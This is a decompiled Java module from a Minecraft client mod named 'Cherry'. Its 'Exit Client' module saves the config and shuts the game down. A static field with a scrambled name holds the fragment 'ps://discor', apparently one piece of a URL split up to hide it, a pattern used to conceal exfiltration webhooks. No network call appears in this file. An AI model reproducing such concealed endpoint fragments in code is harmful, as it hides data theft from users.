//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\user\Desktop\1.12 stable mappings"!

//Decompiled by Procyon!

package com.cocoapc.cherry.features.modules.misc;

import com.cocoapc.cherry.features.modules.*;
import com.cocoapc.cherry.*;

public class ClientShutdown extends Module
{
    public static String Iufgaiogwagwai9ghw89agh98aw;
    
    public ClientShutdown() {
        super("Exit Client", "", Category.MISC, true, false, false);
    }
    
    @Override
    public void onEnable() {
        Cherry.eventManager.onUnload();
        Cherry.moduleManager.onUnload();
        Cherry.configManager.saveConfig(Cherry.configManager.config.replaceFirst("SweetPlus/", ""));
        Cherry.moduleManager.onUnloadPost();
        ClientShutdown.mc.shutdown();
    }
    
    @Override
    public void onRender3D() {
    }
    
    static {
        ClientShutdown.Iufgaiogwagwai9ghw89agh98aw = "ps://discor";
    }
}
